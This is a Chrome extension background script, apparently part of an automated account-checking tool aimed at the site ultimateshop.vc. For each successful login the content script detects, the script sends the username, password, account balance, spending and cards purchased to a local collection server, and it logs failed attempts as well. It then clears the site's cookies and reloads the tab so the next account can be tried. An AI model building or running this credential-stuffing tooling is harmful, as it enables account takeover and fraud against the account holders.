// Listen for messages from content script
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    console.log('UltimateShop Background: Received message:', message.type);
    
    if (message.type === 'hit_detected') {
        // Report successful login to server
        fetch('http://localhost:5050/report-hit', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                username: message.username,
                password: message.password,
                balance: message.balance,
                totalSpent: message.totalSpent,
                cardsPurchased: message.cardsPurchased
            })
        }).then(response => {
            if (response.ok) {
                console.log('UltimateShop Background: Hit reported successfully');
            } else {
                console.error('UltimateShop Background: Failed to report hit');
            }
        }).catch(error => {
            console.error('UltimateShop Background: Error reporting hit:', error);
        });
        
        // Clear cookies for ultimateshop.vc
        chrome.cookies.getAll({ domain: 'ultimateshop.vc' }, (cookies) => {
            cookies.forEach(cookie => {
                const url = `https://${cookie.domain}${cookie.path}`;
                chrome.cookies.remove({ url, name: cookie.name });
            });
            console.log('Cleared cookies for ultimateshop.vc');
            
            // Auto-refresh current tab for new account
            setTimeout(() => {
                chrome.tabs.reload(sender.tab.id, () => {
                    console.log('Tab refreshed for new account:', sender.tab.id);
                });
            }, 2000); // Wait 2 seconds before refresh
        });
        
    } else if (message.type === 'fail_detected') {
        // Report failed login to server
        fetch('http://localhost:5050/report-fail', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                username: message.username,
                password: message.password
            })
        }).then(response => {
            if (response.ok) {
                console.log('UltimateShop Background: Fail reported successfully');
            } else {
                console.error('UltimateShop Background: Failed to report fail');
            }
        }).catch(error => {
            console.error('UltimateShop Background: Error reporting fail:', error);
        });
        
        // Clear cookies for ultimateshop.vc
        chrome.cookies.getAll({ domain: 'ultimateshop.vc' }, (cookies) => {
            cookies.forEach(cookie => {
                const url = `https://${cookie.domain}${cookie.path}`;
                chrome.cookies.remove({ url, name: cookie.name });
            });
            console.log('Cleared cookies for ultimateshop.vc');
            
            // Auto-refresh current tab for new account
            setTimeout(() => {
                chrome.tabs.reload(sender.tab.id, () => {
                    console.log('Tab refreshed for new account:', sender.tab.id);
                });
            }, 2000); // Wait 2 seconds before refresh
        });
    }
});